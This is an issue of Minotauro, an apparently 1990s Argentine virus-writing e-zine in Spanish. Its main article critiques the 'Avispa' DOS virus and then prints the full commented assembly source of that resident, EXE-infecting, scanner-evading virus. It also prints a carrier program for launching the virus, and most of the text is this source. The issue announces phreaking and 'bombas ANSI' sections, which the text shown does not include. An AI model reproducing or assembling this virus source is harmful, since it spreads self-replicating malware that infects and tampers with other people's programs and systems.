Welcome to Minotuaro Magazine Issue #2... 

	Nos volvemos a encontrar, luego de 1 largo y duro mes, para volver con
sangre nueva. Con esto me refiero a nuevos integrantes del Staff :-)
+ Mortal: Co-Columnista de las  reas de Phreaking con Dr. Retro
+ Dr. Retro: Co-Columnista de las  reas de Phreaking con Mortal
+ Wma: Nuestro nuevo Coder de reciente incorporaci¢n

	Desde el pr¢ximo n£mero incorporamos una nueva secci¢n, el objeto de
resolver las dudas que tengan sobre programaci¢n o phreaking. Las dudas ser n
planteadas oficialmente en estos BBS y ser n publicadas en el pr¢ximo n£mero:

        Dionysios I     +54-1-253-4389 (23hs a 09hs GMT-3)
        Dionysios II    +54-1-253-2098 (23hs a 09hs GMT-3)

(Aclararle a los SysOps que vienen por la revista)

(DIS)CLAIMER:
	Como todos ya sabr n, los art¡culos presentados en la revista son pura
y exclusiamente a modo pr ctico, osea, que cualquier mal uso de esta informa_
ci¢n, ser  sancionada por la CNPR (Comisi¢n Nacional de Programaci¢n Rogue) y
el acusado ser  sentenciado dependiendo del tama¤o del acto il¡cito que haya
cometido:
+ Destrucci¢n de menos de 270 Megas de informaci¢n de otras personas:
	1 mes de suspensi¢n y secuestro del equipo.
+ Destrucci¢n de menos de 150 Megas de informaci¢n de otras personas:
	2 meses de suspensi¢n y una multa de $300.
+ Destrucci¢n de menos de 80 Megas de informaci¢n de otras personas:
	Pena de Muerte

===============================================================================
Indice:
 1) Producci¢n Nacional : Avispa
 2) Programaci¢n de Virus #3 (Residencia)
 3) Diccionario de t‚rminos
 4) Full TB Stealth
 5) Bombas ANSI
 6) Curso de Debug
 7) Phreaking desde Zero
===============================================================================
Producci¢n Nacional #1 : Avispa...
-------------------------------------------------------------------------------

	Esta es una nueva seccion en Minotauro, dedicada exclusivamente a los
virus producidos en Argentina. El virus de hoy es el Avispa, escrito por
Elijah Baley. A este virus se lo ha llamado 'polimorfico'. Sin embargo, no lo
es del todo, ya que mas que polimorfosear la rutina de desencripcion, le
cambia algunos bytes al azar. Mas que polimorfismo, es encripcion variable.
	El virus infecta EXE de la manera tradicional, y es residente. El
modo de residencia es el mas sencillo y obvio, pues usa sencillamente la
llamada al DOS (ver el articulo de Modos de residencia en este mismo numero,
por Zarathustra). Ademas tampoco esta demasiado bien escrito, hay un pedazo de
codigo muerto y algunos 'datos' que no se usan nunca, y por si esto fuera poco,
la implementacion de la rutina de infeccion es bastante pobre, ya que abre y
cierra el file que esta infectando como 3 o 4 veces. Un poco de planificacion
y organizacion hubieran evitado esto.
	Pero a pesar de todo, este virus tiene un punto a su favor. Se trata
del auto reconocimiento. Mientras otros virus encriptados reconocen los files
previamente infectados poniendo una 'marca' en el time/date del file, quedando
al descubierto a la flag del TBAV y otras inconveniencias, este virus
implementa un sencillo pero MUY original metodo de Checksum. En definitiva,
una idea lo bastante buena como para imponerse :-).

% El disparador %
	El virus tiene un disparador, pero no es destructivo. Si se trata de
leer de disco (int 13) aproximadamente una vez cada hora el virus va a
sobreescribir lo leido con el texto que insulta a Menem. (Obviamente lo
sobreescribe en memoria. No es destructivo).
	Sencillamente, intercepta la INT 13, y si se intenta leer de disco
alguna pista mayor a la 10, y la palabra menos significativa de la variable de
BIOS que almacena los "ticks since midnight" es cero (lo cual sucede una vez
por hora aproximadamente), el virus primero lee normalmente el sector que le
piden, y luego sobreescribe lo leido en memoria por el texto de Menem.

% El polimorfismo %
	El "polimorfismo" de este virus en realidad no lo es tal. El virus
sencillamente variabiliza la rutina de desencripcion cambiando algunos de los
bytes de manera azarosa.
	Primero, en el seteo de los registros para la desencripcion, el virus
variabiliza los MOVs. Por ejemplo, el virus guarda en BX el base address
durante la encripcion. Para que el MOV para setear BX no sea siempre igual,
el virus calcula un numero al azar y se lo resta a lo que tiene que mover
a BX, y modifica el codigo. Veamos...
	MOV BX, 0900	=	MOV BX, 0800	=	MOV BX, F600
	ADD BX, 0000		ADD BX, 0100		ADD BX, 1300
	Entienden? El virus hace esto con BX (address), CX (Encryption Key) y
AX (para la comparacion para salir del loop). Otra forma de variabilizar del
virus es intercambiar el orden de algunas instrucciones. Por ejemplo, el virus
necesita incrementar en 2 BX en cada vuelta del loop. Esto lo hace de 4 formas
distintas, las cuales va intercambiando en cada infeccion:
	INC BX	=>    	INC BX	 =>	NOP     =>	ADD BX, 2
	INC BX	    	NOP		INC BX
	NOP         	INC BX		INC BX
	Estos tres bytes, sin embargo, estan siempre en posiciones fijas. La
ultima forma de variabilizar la rutina que tiene el virus son las ordenes
trash. No hay un numero al azar de ordenes trash al azar, sino que dentro del
codigo hay unos "lugares" predefinidos de 2 bytes, en los que las ordenes
trash se pueden intercambiar. Y asi, por ejemplo, donde antes habia un
PUSH AX/POP AX, ahora hay un MOV DL, DL.
	Todo esto ayuda efectivamente a variabilizar la rutina de desencripcion
pero tiene la terrible falla de que deja bytes fijos, y lo que es peor, en
posiciones fijas. Esto hace posible (a los antivirusistas) definir una string
que puede ser agregada a cualquier antivirus, usando wildcards. Esto ya es
suficiente (a mi modo de ver) para decir que el "polimorfismo" del virus no es
tan bueno.

	De todas maneras, independientemente de las criticas tecnicas que
puedan hacerse a este virus, lo que nadie puede discutir es que se disperso
bastante. Esto le da suficiente "merito" como estar aqui :-), aparte del
merito que tiene por haber sido el primer virus mas o menos "polimorfico" de
Argentina. Recuerden, Produccion Nacional.
								Trurl

 El virus en si
; --------------------- AVISPA : Cut Here -----------------------------------
avispa		segment byte public
; Desensamblado por Trurl para Minotaur Magazine #2.
	assume cs:avispa, ds:avispa, es:avispa, ss:avispa
	.186
	org 100h
; Virus: Avispa
; Tipo: Residente, Parasitico, Infector de EXE, Encriptado
; Size: 2048(+15) bytes.
; Origen: Argentina
Start:
; Lo que viene a continuacion es la rutina desencriptora. Varia de infeccion
; a infeccion en algunos bytes, pues el virus hace todo un intercambio.
	MOV	BX,0
	PUSH	CX
	POP	CX
	ADD	BL,0
	PUSH	DX
	POP	DX
Decrypt:
	MOV	AX,cs:[BX]
	PUSH	DX
	POP	DX
	MOV	CX,0
	PUSH	DX
	POP	DX
	SUB	CL,0
	PUSH	SI
	POP	SI
	NOP
	XOR	AX,CX
	PUSH	SI
	POP	SI
	MOV	cs:[BX],AX
	PUSH	SI
	POP	SI
	INC	BX
	NOP
	INC	BX
	PUSH	SI
	POP	SI
	MOV	AX,0
	PUSH	DI
	POP	DI
	ADD	AX,0
	PUSH	DI
	POP	DI
	NOP
	CMP	BX,AX
	PUSH	DI
	POP	DI
	JB	Decrypt
	NOP
VirBegin:
	JMP	StartVir
; Data
	fHandler	dw	0 ; Handler del file a infectar
	OldEntryPoint	dd	0 ; CS:IP del header EXE
	OldStackPtr	dd	0 ; SS:SP del header EXE
	ErrorVar	db	0 ; Flag de error (1 ==> Error)
	; la linea que sigue es un desperdicio de 4 bytes
			db	0,0,0,0 ; al pedo 1
	OldInt21	dd	0 ; Puntero a ISR de INT 21 original.
	NamePtr		dd	0 ; Puntero a filename en llamada a 4B INT 21.
	OldInt24	dd	0 ; Puntero a ISR de INT 24 original.
	; esto ya es medio alevoso.
			db	0,0,0,0 ; al pedo 2
	OldInt13	dd	0 ; Puntero a ISR de int 13 original.
	ReadBuffer	db	34h dup(?) ; Buffer para lectura (usado para autoreconocimiento del virus)
	fAttr		dw	0 ; Atributo del file a infectar.
	fTimeDate	dd	0 ; Time & Date del file.
	BytePara	db	0 ; Nro. de bytes que faltan para el para.
	ShitByte	db	0 ; byte para la garbage para poner al final.
	MemBlock	dw	0 ; usado durante la infeccion.
	; comienzo a sospechar que puso ceros para despistar.
			db 	0, 0 ; al pedo 3
	VirName	db	"__ Virus Avispa - Buenos Aires - Noviembre 1993 __"

; ...........................................................................
; Parte instaladora
; Aqui viene el control luego de que el virus ha sido desencriptado.
StartVir:
	MOV	AX,4BFFh ; residence test
	INT	21h	 ; definido por el mismo
	CMP	AX,4BFEh
	JNZ	Install_Virus ; Si no esta en memoria => Instalar virus
; Esta en memoria. Correr hoste.
	MOV	AX,word ptr cs:OldStackPtr+2
	MOV	BX,DS
	ADD	AX,10h
	ADD	AX,BX   ; Pone en SS y SP sus valores originales
	MOV	SS,AX   ; (del header exe previo a la infeccion).
	MOV	AX,word ptr cs:OldStackPtr
	MOV	SP,AX
	MOV	AX,cs:word ptr OldEntryPoint+2; del CS:IP de entrada.
	MOV	BX,DS	; Y a hora saltar al adress original
	ADD	AX,10h
	ADD	AX,BX
	PUSH	AX
	MOV	AX,cs:word ptr OldEntryPoint
	PUSH	AX
	RETF

; No esta en memoria
Install_Virus:
	PUSH	DS	; Lo que esta haciendo es copiar su
	POP	ES	; propio codigo, que esta al final del
	MOV	DI,100h	; bloque de memoria del programa hoste
	PUSH	CS	; al principio de este bloque, para asi
	POP	DS	; quedar residente correctamente con
	MOV	SI,100h	; una llamada normal a DOS.
	CLD		; Esto produce que no pueda pasar el control al
	MOV	CX,800h ; hoste entregando el control al CS:IP si tiene que
	REPZ		; instalarse. Para hacerlo, debe correrlo via 4B.
	MOVSB

	PUSH	ES	; A continuacion salta al codigo que acaba de copiar.
	PUSH  offset Branch_Address
	RETF
Branch_Address:
	PUSH	CS	; modifica el bloque de memoria para
	POP	DS	; ponerlo en 90 paragrafos
	MOV	AH,4Ah	; (2304 bytes)
	PUSH	CS
	POP	ES
	MOV	BX,90h
	INT	21h

; Colgadas de las interrupciones.
	MOV	AX,3521h	; Obtener IVT entry de Int 21
	INT	21h
	MOV	word ptr OldInt21,BX; y guardarla.
	MOV	word ptr OldInt21+2,ES
	MOV	AX,3513h	; Obtener Int 13
	INT	21h
	MOV	word ptr OldInt13,BX; y guardarla
	MOV	word ptr OldInt13+2, ES
	MOV	AX,2521h	; hookear int 21
	MOV	DX,offset NewInt21
	INT	21h
	MOV	AX,2513h	; hookear int 13
	MOV	DX,offset NewInt13
	INT	21h

	MOV	ES,word ptr ds:[2Ch]
	MOV	BX,0
GetName:
	MOV	AX,es:[BX]
	CMP	AX,0
	JZ	GotName
	INC	BX
	CMP	BX,12Ch
	JNZ	GetName
	;JMP	KeepRes ; Este JMP hay que hacerlo HARD CODED!
aux_1:	db 0e9h
	dw offset KeepRes-3-offset aux_1

; Zona de datos. Es usado para llamar a prog orign.
DataForRun:
	dw 	 ?	; Environment Segment
	dw       0080H
	dw	 ?      ; Far pointer to Command Line
	dw	 005CH
	dw	 ?      ; Far pointer to FCB 1
	dw	 006CH
	dw	 ?      ; Far pointer to FCB 2
GotName:
	ADD	BX,4
	MOV	DX,BX
	MOV	word ptr DataForRun,ES
	MOV	word ptr DataForRun+4,CS
	MOV	word ptr DataForRun+8,CS
	MOV	word ptr DataForRun+12,CS
	MOV	BX,offset DataForRun
	PUSH	ES
	POP	DS
	PUSH	CS
	POP	ES
	MOV	AX,4B00h
	PUSH	CS
	POP	SS
	MOV	SP,900h
	PUSHF
	CALL	dword ptr cs:OldInt21
	PUSH	DS
	POP	ES
	MOV	AH,49h
	INT	21h
; Quedar residente mediante INT21 AH=31. con 90 para.
KeepRes:
	MOV	AH,31h
	MOV	DX,90h
	INT	21h
; El codigo que sigue es un absoluto desperdicio de 4 bytes.
; Quiza Elijah no sabia que AH=31 INT 21 no devuelve el control :-)
; (te digo de buena onda, Elijah, hehe)
	MOV	AH,4Ch
	INT	21h

; ...........................................................................
; Rutinas residentes

NewInt21:
	CMP	AX,4BFFh
	JNZ	GoOn
	DEC	AX		; residence test
	IRET
; no es residence test.
GoOn:
	CMP	AX,4B00h	; Es funcion Run program?
	JZ	RunProgramFunc
	JMP	dword ptr cs:OldInt21 ; no => INT 21 original.

RunProgramFunc:
	PUSHA
	PUSH	ES
	PUSH	DS
	MOV	cs:word ptr NamePtr+2,DS; guardar ds
	MOV	cs:word ptr NamePtr,DX	; y dx en memoria cuidadosamente.
	CALL	Infect			; llamar a rutina infectora.
	POP	DS
	POP	ES
	POPA
	JMP	dword ptr cs:OldInt21	; int 21 original.

Infect:
	CALL	CheckName	; chequeo del nombre
	PUSH	CS
	POP	DS
	CMP	AH,0		; Si el nombre = OK infecta.
	JZ	NameIsOk
	MOV	AH,1		; si el nombre del file termina con
	RET			; AN, LD, OT, an, ld, ot, no infecta

NameIsOk:
	MOV	AH,3Dh		; Abrir el file para r/w
	MOV	AL,2
	MOV	DX,word ptr NamePtr
	MOV	DS,cs:word ptr NamePtr+2
	PUSHF
	CALL	dword ptr cs:OldInt21
	JB	ErrorAndGetOut	; Si hubo error => Sale
	PUSH	CS
	POP	DS
	MOV	fHandler,AX	; Guardar el handler
	MOV	BX,AX

	MOV	AH,3Fh		; Leer 7f bytes a offset 80.
	MOV	CX,7Fh		; (cs:80+80h =  cs:ff, je je)
	MOV	DX,80h
	PUSHF
	CALL	dword ptr cs:OldInt21

	MOV	AH,3Eh
	MOV	BX,fHandler
	PUSHF
	CALL	dword ptr cs:OldInt21	; cerrar file.

	CMP	WORD PTR ds:[80h],5A4Dh	; Si no es exe, no infecta
	JNZ	ErrorAndGetOut
	CMP	WORD PTR ds:[94h],0	; Si CS o IP=0, AH=1 y
	JNZ	ProceedInfect				; no infecta.
	CMP	WORD PTR ds:[96h],0	; sino, infecta. (335)
	JZ	ErrorAndGetOut
	;JMP	ProceedInfect 		; otro que hay que hacer hard coded
aux_2:	db 0e9h
	dw offset ProceedInfect-offset aux_2-3

ErrorAndGetOut:
	MOV	AH,1
	RET

ProceedInfect:
	PUSH	CS
	POP	DS
	MOV	AH,3Dh			; reabre el file.
	MOV	AL,2
	MOV	DX,word ptr NamePtr
	MOV	DS,word ptr cs:NamePtr+2
	PUSHF
	CALL	dword ptr cs:OldInt21

	JB	ErrorAndGetOut		; Si hubo error => Sale con error
	PUSH	CS
	POP	DS
	MOV	fHandler,AX		; Guarda el handler de nuevo
	MOV	AX,4202h		; Mover el puntero al final del
	MOV	BX,fHandler		; file.
	MOV	DX,0
	MOV	CX,0
	INT	21h
	CMP	AX,34h			; Si ax>= 34h ==> dx
	JB	DecDx			; Si ax<34h ==> dx--;
	;JMP	Sub34 ; otro hard coded
aux_3:	db 0e9h
	dw offset Sub34-offset aux_3-3
DecDx:
	DEC	DX
Sub34:
	SUB	AX,34h       ; Le resta 34h al size del file.
	MOV	CX,DX
	MOV	DX,AX
	MOV	AX,4200h
	MOV	BX,fHandler  ; Mueve el ptr 34h bytes adelante
	INT	21h	     ; del eof.

	MOV	AH,3Fh	     ; Lee 34h bytes a Buffer
	MOV	BX,fHandler
	MOV	CX,34h
	MOV	DX,offset ReadBuffer
	INT	21h

	MOV	AH,3Eh	     ; Cierra el file.
	MOV	BX,fHandler
	INT	21h

	MOV	BX,offset ReadBuffer ; Esta porcion de codigo es para
	MOV	CX,[BX]		     ; auto-reconocerse.
	ADD	BX,2		     ; Mientras otros virus encriptados y
	MOV	DX,0		     ; polimorficos se reconocen
LoopChecksum:			     ; manipulando la fecha u hora del file,
	MOV	AX,[BX]		     ; este implementa una especie de
	XOR	AX,CX		     ; checksum. Muy Bueno.
	ADD	DX,AX
	INC	BX
	INC	BX
	CMP	BX,offset ReadBuffer+34h
	JNZ	LoopChecksum
	CMP	DX,7DDAh
	JNZ	NotInfected	; Si no esta, ==> NotInfected
GetOut:
	JMP	ErrorAndGetOut		; Si ya esta infectado, sale
NotInfected:
	MOV	AX,3524h		; Guarda viejo vector y captura
	INT	21h			; la int de Critical error handler
	MOV	word ptr OldInt24,BX	; a una rutina 'dummy'
	MOV	word ptr OldInt24+2,ES
	MOV	AX,2524h
	MOV	DX,offset NewInt24 	; dummy error handler
	INT	21h

	MOV	AH,43h			; Obtiene el atributo del file.
	MOV	AL,0
	MOV	DX,word ptr NamePtr
	MOV	DS,cs:word ptr NamePtr+2
	INT	21h

	PUSH	CS
	POP	DS
	MOV	BYTE PTR ErrorVar,0	; pone 0 en la variable de er.
	MOV	fAttr,CX		; guarda el atributo.

	MOV	AH,43h			; Pone el atributo del file.
	MOV	AL,1			; a 0, pasando por encima de la
	MOV	DX,word ptr NamePtr	; flag ReadOnly
	MOV	CX,0
	MOV	DS,cs:word ptr NamePtr+2
	INT	21h
	; JMP	Skip1 ; otro hard coded y van... pero con que mierda
aux_4:	db 0e9h; ensambla este tipo?
	dw offset Skip1-offset aux_4-3
NearGetOut:
	JMP	GetOut
Skip1:
	PUSH	CS
	POP	DS
	MOV	AX,2524h		; Vuelve a poner en el valor original
	MOV	DX,word ptr OldInt24	; al vector de INT 24
	MOV	DS,cs:word ptr OldInt24+2
	INT	21h

	PUSH	CS
	POP	DS
	CMP	BYTE PTR ErrorVar,1	; Ve la flag de error.
	JZ	GetOut			; si lo hubo, sale

; si no hubo error, sigue aqui
	MOV	AH,3Dh			; Reabre el file (3ra vez!) en
	MOV	AL,2			; modo lectura escritura/
	MOV	DX,word ptr NamePtr
	MOV	DS,cs:word ptr NamePtr+2
	PUSHF
	CALL	dword ptr cs:OldInt21

	JB	NearGetOut		; si hubo error, sale
	PUSH	CS
	POP	DS
	MOV	fHandler,AX		; guarda el handler

	MOV	AH,57h			; Obtiene la vieja time&date
	MOV	AL,00			; stamp del file
	MOV	BX,fHandler
	INT	21h
	MOV	word ptr fTimeDate,DX	; y la guarda
	MOV	word ptr fTimeDate+2,CX
	MOV	BYTE PTR BytePara,0	; clarea la cuenta de bytes para el paragr.

RoundToPara:
	MOV	AX,4202h		; mueve el puntero al fin del file
	MOV	BX,fHandler
	MOV	CX,0
	MOV	DX,0
	INT	21h
	CMP	CX,0fh
	JA	NearGetOut2

	MOV	BX,10h			; Ve si el file termina en paragrafo
	DIV	BX
	CMP	DX,0
	JZ	RoundedUp		; Termina en para => RoundedUp

	MOV	AH,40h			; Si no termina el paragrafo, 
	MOV	BX,fHandler		; escribe un byte de "shitbyte"
	MOV	CX,1			; y vuelve a empezar todo.
	MOV	DX,offset ShitByte
	INT	21h
	MOV	AH,BytePara		; incrementa el nro. de bytes para el
	INC	AH			; paragrafo.
	MOV	BytePara,AH
	JMP	RoundToPara

; Si al pedir largo de file, CX = 15 viene aca
NearGetOut2:
	PUSH	CS
	POP	DS
	MOV	AH,3Eh				; Cierra el file
	MOV	BX,fHandler
	INT	21h
	MOV	AH,1				; y vuelve con error.
	RET

; Aqui ya redondeo el fin del file en paragrafo.
; El header EXE del file esta en offset 80.
RoundedUp:
	SUB	AX,10h		; En ax tenia el numero de parafos del file.

	MOV	CX,ds:[84h]	; Modifica el numero de 'paginas'
	ADD	CX,4		; de 512 b. del header exe
	MOV	ds:[84h],CX
	SUB	AX,ds:[88h]	; (le resta el header size)
	MOV	CX,ds:[94h]	; Guarda en variables el viejo entry point.
	MOV	word ptr OldEntryPoint,CX
	MOV	CX,ds:[96h]
	MOV	word ptr OldEntryPoint+2,CX
	MOV	CX,ds:[8Eh]	; Idem el viejo SS:SP
	MOV	word ptr OldStackPtr+2,CX
	MOV	CX,ds:[90h]
	MOV	word ptr OldStackPtr,CX

	MOV	ds:[96h],AX		; Modifica el CS del header
	MOV	ds:[8Eh],AX		; Modifica el SS del header
	MOV	WORD PTR ds:[90h],900h  ; pone sp
	MOV	WORD PTR ds:[94h],100h  ; e ip a valores constantes
	MOV	AX,ds:[82h]
	SUB	BX,BX
	MOV	BL,BytePara
	ADD	AX,BX
	MOV	ds:[82h],AX		; Modifica el reminder
	MOV	AH,48h
	MOV	BX,90h			; pide un 2do bloque de memoria.
	INT	21h			; de 90 para.
	JB	NearGetOut2		; si error => sale
	MOV	cs:word ptr MemBlock,AX	; guarda el seg del bloque obt.
	MOV	ES,MemBlock
	MOV	DI,100h
	MOV	SI,100h
	CLD
	MOV	CX,800H	;?		 ; se copia en ese bloque.
	REPZ
	MOVSB

	CALL	VariableEncryption	; Variabiliza la otra copia del vir.
	PUSH	CS
	POP	DS
	MOV	BX,fHandler		; escribe al final del file la
	MOV	CX,800H			; copia del otro bloque
	MOV	AH,40h
	MOV	DX,100h
	MOV	DS,cs:MemBlock
	INT	21h
	PUSH	CS
	POP	DS
	MOV	AH,42h			; se mueve al principio del file
	MOV	AL,0
	MOV	BX,fHandler
	MOV	CX,0
	MOV	DX,0
	INT	21h
	MOV	AH,40h			; escribe el header exe modified
	MOV	BX,fHandler
	MOV	CX,1Eh
	MOV	DX,80h
	INT	21h

	PUSH	CS
	POP	DS
	MOV	AH,57h			; repone la vieja time and date
	MOV	AL,1			; stamp
	MOV	CX,word ptr fTimeDate+2
	MOV	DX,word ptr fTimeDate
	MOV	BX,fHandler
	INT	21h
	MOV	AH,3Eh			; cierra el file
	MOV	BX,fHandler
	INT	21h
	MOV	AH,43h			; repone el viejo atributo
	MOV	AL,1
	MOV	CX,fAttr
	MOV	DX,word ptr NamePtr
	MOV	DS,cs:word ptr NamePtr+2
	INT	21h
	PUSH	CS
	POP	DS
	MOV	AH,49h			; libera el bloque de memoria
	MOV	ES,MemBlock
	INT	21h
	MOV	AH,0
	RET				; sale

	CryptKey		dw	0; Variable de Encripcion
GarbageInstruccions:
; Estas instrucciones-basura son usadas para variabilizar la rutina de
; desencripcion del virus durante la encripcion.
	MOV	AH,AH
	MOV	BH,BH
	MOV	CH,CH
	MOV	DH,DH
	MOV	AL,AL
	MOV	BL,BL
	MOV	CL,CL
	MOV	DL,DL
	PUSH	AX
	POP	AX
	PUSH	BX
	POP	BX
	PUSH	CX
	POP	CX
	PUSH	DX
	POP	DX
	PUSH	SI
	POP	SI
	PUSH	DI
	POP	DI
	PUSH	ES
	POP	ES
	PUSH	DS
	POP	DS
	MOV	CL,CL

VariableEncryption:
; La llama ANTES de escribir el codigo en el 2do bloque de mem.
; Como se puede ver, no es polimorfismo sino en todo caso "encripcion variable"
	MOV	DS,cs:MemBlock	; mueve a ds el 2 bloque del v.
	PUSH	AX
	MOV	AX,0040h
	MOV	ES,AX
	POP	AX
	XOR	DX,DX			; lee el byte menos significat
	MOV	DL,es:[6Ch]		; de los ticks since midnight
	MOV	CX,offset VirBegin; le resta a 314 (13a) eso.
	SUB	CL,DL
	MOV	word ptr Start+1,CX	; guarda resto en orden mov
	MOV	WORD PTR Start+5,0C380h ; pone "add bl, "
	MOV	byte ptr Start+7,DL	; y el dl en orden add
	MOV	DX,es:[6Ch]		; en DX a los ticks le suma
	ADD	DX,CS:MemBlock		; el seg del bloque
	MOV	CS:CryptKey,DX		; y lo guarda
	MOV	CX,ES:[6Ch]		; a la word - sign. de los  ticks le
	ADD	CX,ES:[6Eh]		; suma la word + significativa.
	MOV	CH,0			; Todo esto es para sacar un valor
	ADD	DL,CL			; mas o menos azaroso.
	MOV	word ptr Start+10h,DX   ; y guarda
	MOV	byte ptr Start+16h,CL
	MOV	AX,CX

	; Para Randomizar el XOR AX, CX | NOP
	JPE	IsEven
	MOV	WORD PTR Start+19h,0C133h; si no es par =>
	MOV	BYTE PTR Start+1bh,90h	; xor ax, cx | nop
	; JMP	IsOdd ; increible. que ensambla, en A86? caray!
aux_5:	db 0e9h
	dw offset IsOdd-offset aux_5-3
IsEven:
	MOV	BYTE PTR Start+19h,90h	; si es par =>
	MOV	WORD PTR Start+1ah,0C133h; nop | xor ax, cx

	; Zona para Randomizar el ADD BX, 2
IsOdd:
	CMP	WORD PTR Start+23h,4343h ; inc bx | inc bx | nop?
	JZ	IsIncIncNop
	CMP	WORD PTR Start+24h,4343h ; nop | inc bx | inc bx?
	JZ	IsNopIncInc
	CMP	WORD PTR Start+23h,0C383h ; add bx, ?
	JZ	IsAdd
	MOV	WORD PTR Start+23h,4343h ; inc bx | nop | inc bx =>
	MOV	BYTE PTR Start+25h,90h	; INC BX | INC BX | NOP
	; JMP	Skip2Next ; esto ya es una joda
aux_6:	db 0e9h
	dw offset Skip2Next-offset aux_6-3
IsIncIncNop:
	MOV	BYTE PTR Start+23h,90h	; inc bx | inc bx | nop
	MOV	WORD PTR Start+24h,4343h ; NOP | INC BX | INC BX
	; JMP	Skip2Next ; esto ya me esta cansando
aux_7:	db 0e9h
	dw offset Skip2Next-offset aux_7-3
IsNopIncInc:
	MOV	WORD PTR Start+23h,0C383h ; nop | inc bx | inc bx
	MOV	BYTE PTR Start+25h,2		; SUB AX, 2
	; JMP	Skip2Next ; de mas esta decir que tengo las pelotas hasta el suelo
aux_8:	db 0e9h
	dw offset Skip2Next-offset aux_8-3
IsAdd:
	MOV	BYTE PTR Start+23h,43h	; add bx, ?
	MOV	BYTE PTR Start+24h,90h	; INC BX | NOP | INC BX
	MOV	BYTE PTR Start+25h,43h

	; Zona para Randomizar el mov ax, fin
Skip2Next:
	MOV	CX,8CCh ; largo total
	MOV	DX,es:[6Dh]
	SUB	CX,DX
	MOV	word ptr Start+29h,CX
	MOV	word ptr Start+2eh,DX
	MOV	AX,DX
	; Zona para randomizar el cmp bx, ax | nop
	JPE	IsEven2
	MOV	WORD PTR Start+32h,0C339h
	MOV	BYTE PTR Start+34h,90h
	; JMP	DoneCmpNop; si encuentro al autor del A86 lo castro
aux_9:	db 0e9h
	dw offset DoneCmpNop-offset aux_9-3
IsEven2:
	MOV	BYTE PTR Start+32h,90h
	MOV	WORD PTR Start+33h,0C339h
	; Zona para agregar ordenes trash
DoneCmpNop:
	MOV	CX,0Bh
	MOV	BX,offset Start+3
AddTrash:
	XOR	DX,DX		; Esta parte del codigo cambia las "ordenes
	XOR	AX,AX		; basura" de la rutina de encripcion.
	MOV	AL,es:[6Ch]
	ADD	AL,BL
	MOV	DL,10h
	DIV	DL
	ADD	AL,AL
	MOV	AH,00
	MOV	SI,offset GarbageInstruccions
	ADD	SI,AX
	MOV	DX,cs:[SI]
	MOV	[BX],DX
	ADD	BX,5
	LOOP	AddTrash

	; Parte para encriptar el codigo en si.
	PUSH	CS
	POP	DS
	MOV	ES,MemBlock	; ES <= VIRUS SEGMENT
	MOV	BX,offset VirBegin; BX <= BASE ADRESS
	MOV	CX,CryptKey	; CX <= ENCRYPTION KEY
EncryptIt:
	MOV	AX,ES:[BX]
	XOR	AX,CX
	MOV	ES:[BX],AX
	INC	BX
	INC	BX
	CMP	BX,8CCh
	JB	EncryptIt

	; Esta parte es para poner trash en la ultima parte del virus
	PUSH	CS
	POP	DS
	MOV	DI,8CEh
	MOV	ES,MemBlock
	MOV	SI,offset VirName
	CLD
	MOV	CX,32h
	REPZ
	MOVSB
	PUSH	AX
	MOV	AX,40h
	MOV	ES,AX
	POP	AX
	MOV	CX,es:[6Ch]
	MOV	ES,cs:MemBlock
	MOV	es:[8CCh],CX
	MOV	BX,8CEh
TooMuchShit:
	MOV	AX,es:[BX]
	XOR	AX,CX
	MOV	es:[BX],AX
	INC	BX
	INC	BX
	CMP	BX,900h
	JB	TooMuchShit
	RET

CheckName: ; Compara si el nombre dado en DS:DX
; Si las ultimas dos letras son AN, LD, OT, o an, ld, ot, devuelve 1 en ah
; si no devuelve ah=0
	MOV	BX,DX
GetPoint:
	CMP	BYTE PTR [BX],2Eh		; busca el punto, para ext.
	JZ	GotPoint
	INC	BX
	JMP	GetPoint
GotPoint:
	CMP	WORD PTR [BX-2],4E41h; Ultimas dos letras AN
	JZ	BadName
	CMP	WORD PTR [BX-2],6E61h; Ultimas dos letras an
	JZ      BadName
	CMP	WORD PTR [BX-2],444Ch; Ultimas dos letras LD
	JZ      BadName
	CMP	WORD PTR [BX-2],646Ch; Ultimas dos letras ld
	JZ      BadName
	CMP	WORD PTR [BX-2],544Fh; Ultimas dos letras OT
	JZ      BadName
	CMP	WORD PTR [BX-2],746Fh; Ultimas dos letras ot
	JZ      BadName
	MOV	AH,0
	RET
BadName:
	MOV	AH,1
	RET

NewInt24: ; errorhandler
; Rutina 'dummy' para int 24.
; Excepto que setea una variable a uno.
	MOV	BYTE PTR cs:ErrorVar,1
	IRET

NewInt13:
; Rutina reemplazo int 13.
	CMP	AH,2			; Es para lectura?
	JZ	ReadFunc
BackToInt13:
	JMP	dword ptr CS:OldInt13	; Si no, llama a int 13 original.
; es para lectura
ReadFunc:
	CMP	CH,0Ah		; Si nro. de track<10=int 13 orig.
	JB	BackToInt13
; Esto es el disparador ...
	PUSH	ES
	PUSH	AX
	PUSH	AX
	MOV	AX,40h		; Se fija variable de BIOS en
	MOV	ES,AX		; 40:6C = Timer ticks since midnight
	POP	AX		; Es un DWORD.
	MOV	AX,es:[6Ch]
	CMP	AX,0
	JZ	ItsZero		; Si es cero: => 75a
	POP	AX
	POP	ES
	JMP	BackToInt13	; Si != 0, Int 13 orign.
ItsZero:
	POP	AX
	POP	ES
	PUSHF

	CALL	dword ptr cs:OldInt13; Llama a int 13 original con
	JB	ReadError	; Valores originales. Error => sale

	PUSHA
	PUSH	ES
	PUSH	DS
	PUSH	CS
	POP	DS
	MOV	DI,BX		; Sobreescribe lo leido con el texto
	MOV	SI,offset Text	; mas abajo
	MOV	CX,200h
	CLD
	REPZ
	MOVSB
	POP	DS
	POP	ES
	POPA
ReadError:
	IRET

	; Texto para intercambio.
	; Este texto es el que escribe etc. etc. (ver arriba).
Text	db "$$ Virus AVISPA $$ Republica Argentina$$ Elijah Baley "
	db "$$ Noviembre 10 de 1993 "
	db "$$ This program is not an old virus variant, and it was written "
	db "in Argentina by Elijah Baley. It uses polymorphic technics to"
	db " avoid conventional scanning."
	db "$$ MENEM: Libertador de torturadores y asesinos de inocentes, que"
	db " Dios se apiade de tu pobre alma. $$ 64446"
ends avispa
end Start
; --------------------- AVISPA : Cut Here -----------------------------------

 El carrier
; -------------------- Fake Hoste : Cut Here --------------------------------
hoste		segment byte public
	assume cs:hoste, ds:hoste, es:hoste, ss:hoste
	org 100h
FakeHoste:
	mov ax, 4bffh
	int 21h
	cmp ax, 4bfeh
	jnz InstallIt
	mov ax, 4c00h
	int 21h
InstallIt:
	mov ax, cs
	add ax, 80h
	mov ss, ax
	mov sp, 0
	push ax
	push 100h
	retf
EndHoste:
